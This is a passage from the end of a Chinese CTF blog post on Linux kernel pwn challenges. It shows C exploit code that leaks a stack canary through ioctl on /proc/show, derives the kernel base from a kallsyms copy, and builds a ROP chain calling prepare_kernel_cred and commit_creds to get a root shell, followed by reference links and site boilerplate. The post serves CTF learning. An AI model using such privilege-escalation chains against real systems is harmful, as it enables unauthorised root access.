        <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">hex_str</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">&gt;=</span> <span class="sc">'0'</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="sc">'9'</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="p">(</span><span class="n">c</span> <span class="o">-</span> <span class="sc">'0'</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">&gt;=</span> <span class="sc">'a'</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="sc">'f'</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="p">(</span><span class="n">c</span> <span class="o">-</span> <span class="sc">'a'</span> <span class="o">+</span> <span class="mi">10</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span>
        <span class="n">hex_str</span><span class="o">++</span><span class="p">;</span> <span class="p">}</span> <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">doMain</span><span class="p">(){</span>
    <span class="n">bind_core</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">save_status</span><span class="p">();</span>

    <span class="n">fd</span> <span class="o">=</span> <span class="n">odp</span><span class="p">(</span><span class="s">"/proc/show"</span><span class="p">);</span>
    <span class="kt">size_t</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="c1">// show</span>

    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x6677889C</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x40</span><span class="p">);</span>

    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x6677889B</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>

    <span class="n">lss</span><span class="p">(</span><span class="s">"canary"</span><span class="p">,</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>

    <span class="kt">size_t</span> <span class="o">*</span><span class="n">rop</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x2000</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">fd1</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/tmp/kallsyms"</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">tmp</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="n">tmp</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="n">tmp</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
    <span class="n">tmp</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">hexdump</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>

    <span class="kt">size_t</span> <span class="n">kernel_base</span>  <span class="o">=</span> <span class="n">hex_string_to_size_t</span><span class="p">(</span><span class="n">tmp</span><span class="p">);</span>
    <span class="kt">size_t</span> <span class="n">pop_rdi</span>      <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="n">stbase</span><span class="p">(</span><span class="mh">0xffffffff81000b2f</span><span class="p">);</span>
    <span class="kt">size_t</span> <span class="n">prepare_cred</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="n">stbase</span><span class="p">(</span><span class="mh">0xffffffff8109cce0</span><span class="p">);</span>
    <span class="kt">size_t</span> <span class="n">commit_creds</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="n">stbase</span><span class="p">(</span><span class="mh">0xffffffff8109c8e0</span><span class="p">);</span>
    <span class="kt">size_t</span> <span class="n">vfork</span>        <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="n">stbase</span><span class="p">(</span><span class="mh">0xffffffff81081920</span><span class="p">);</span>
    <span class="kt">size_t</span> <span class="n">mov</span>          <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="n">stbase</span><span class="p">(</span><span class="mh">0xffffffff813f9ede</span><span class="p">);</span><span class="c1">// mov rdi, rax ; pop rbp ; mov rax, rdi ; pop r12 ; ret</span>
    <span class="n">lss</span><span class="p">(</span><span class="s">"kernel_base"</span><span class="p">,</span> <span class="n">kernel_base</span><span class="p">);</span>
    <span class="c1">//_exit(0);</span>

    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">prepare_cred</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">mov</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="n">stbase</span><span class="p">(</span><span class="mh">0xffffffff81a008f0</span><span class="p">);</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">get_root_shell</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
    <span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>

    <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">rop</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>

    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x6677889A</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xffffffffFFFF0100</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">extern</span> <span class="kt">void</span> <span class="nf">_start</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">env</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">environ</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">env</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
    <span class="n">doMain</span><span class="p">();</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h2 id="参考文章"><span class="me-2">参考文章</span><a href="#参考文章" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/
https://blog.csdn.net/qq_61670993/category_12450293_2.html
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h2 id="end"><span class="me-2">END</span><a href="#end" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    

    <!-- tags -->
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          本文由作者按照 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         进行授权
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">分享</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FKernel-Pwn-%25E5%2588%25B7%25E9%25A2%2598%25E8%25AE%25B0%25E5%25BD%2595-1%2F&title=Kernel%20Pwn%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="QQ" aria-label="QQ">
        <i class="fa-fw fa-brands fa-qq"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Kernel%20Pwn%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20-%20imLZH1'%20Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FKernel-Pwn-%25E5%2588%25B7%25E9%25A2%2598%25E8%25AE%25B0%25E5%25BD%2595-1%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FKernel-Pwn-%25E5%2588%25B7%25E9%25A2%2598%25E8%25AE%25B0%25E5%25BD%2595-1%2F&text=Kernel%20Pwn%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="分享链接"
      data-title-succeed="链接已复制！"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">最近更新</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Kernel-Pwn-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-1/">Kernel Pwn 刷题记录</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Nullcon-Goa-HackIM-2025-CTF/">HACKIM 2025 CTF 一道wasm pwn题分享</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/LA_CTF-%E9%83%A8%E5%88%86Pwn%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-by-g1P03n/">LA CTF 2025 部分Pwn解题思路 by g1P03n</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-Pwn-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/">第八届西湖论剑-网络攻防实战赛初赛-Pwn-解题思路</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/BRISC-CTF/">2024-BRISC-CTF-Pwn-WriteUps</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">文章内容</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->

























            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/LA_CTF-%E9%83%A8%E5%88%86Pwn%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-by-g1P03n/"
      class="btn btn-outline-primary"
      aria-label="上一篇"
    >
      <p>LA CTF 2025 部分Pwn解题思路 by g1P03n</p>
    </a>
  

  
    <div class="btn btn-outline-primary disabled" aria-label="下一篇">
      <p>-</p>
    </div>
  
</nav>

            
              
              <!--  The comments switcher -->

  
  <!-- https://giscus.app/ -->
<script type="text/javascript">
  (function () {
    const origin = 'https://giscus.app';
    const iframe = 'iframe.giscus-frame';
    const lightTheme = 'light';
    const darkTheme = 'dark_dimmed';

    let initTheme = lightTheme;
    const html = document.documentElement;

    if (
      (html.hasAttribute('data-mode') &&
        html.getAttribute('data-mode') === 'dark') ||
      (!html.hasAttribute('data-mode') &&
        window.matchMedia('(prefers-color-scheme: dark)').matches)
    ) {
      initTheme = darkTheme;
    }

    let giscusAttributes = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'imLZH1/me_giscus_Discussions-',
      'data-repo-id': 'comments',
      'data-category': 'general',
      'data-category-id': '',
      'data-mapping': 'pathname',
      'data-reactions-enabled': '1',
      'data-emit-metadata': '0',
      'data-theme': initTheme,
      'data-input-position': 'bottom',
      'data-lang': 'zh-CN',
      'data-loading': 'lazy',
      crossorigin: 'anonymous',
      async: ''
    };

    let giscusScript = document.createElement('script');
    Object.entries(giscusAttributes).forEach(([key, value]) =>
      giscusScript.setAttribute(key, value)
    );
    document.getElementById('tail-wrapper').appendChild(giscusScript);

    addEventListener('message', (event) => {
      if (
        event.source === window &&
        event.data &&
        event.data.direction === ModeToggle.ID
      ) {
        /* global theme mode changed */
        const mode = event.data.message;
        const theme = mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme;

        const message = {
          setConfig: {
            theme: theme
          }
        };

        const giscus = document.querySelector(iframe).contentWindow;
        giscus.postMessage({ giscus: message }, origin);
      }
    });
  })();
</script>



            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>
    ©
    <time>2025</time>
    <a href="https://user.qzone.qq.com/3461665835">imLZH1</a>.
    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="除非另有说明，本网站上的博客文章均由作者按照知识共享署名 4.0 国际 (CC BY 4.0) 许可协议进行授权。"
      >保留部分权利。</span>
    
  </p>
	<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>

  <p>本站采用 <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> 主题 <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">发现新版本的内容。</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      更新
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    <script src="/assets/lib/jquery/jquery.min.js"></script>
  

  
    <script src="/assets/lib/bootstrap/bootstrap.bundle.min.js"></script>
  

  
    <script src="/assets/lib/simple-jekyll-search/simple-jekyll-search.min.js"></script>
  

  
    <script src="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.umd.min.js"></script>
  

  
    <script src="/assets/lib/magnific-popup/jquery.magnific-popup.min.js"></script>
  

  
    <script src="/assets/lib/clipboard/clipboard.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/dayjs.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/locale/en.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/relativeTime.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/localizedFormat.min.js"></script>
  

  
    <script src="/assets/lib/tocbot/tocbot.min.js"></script>
  








<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

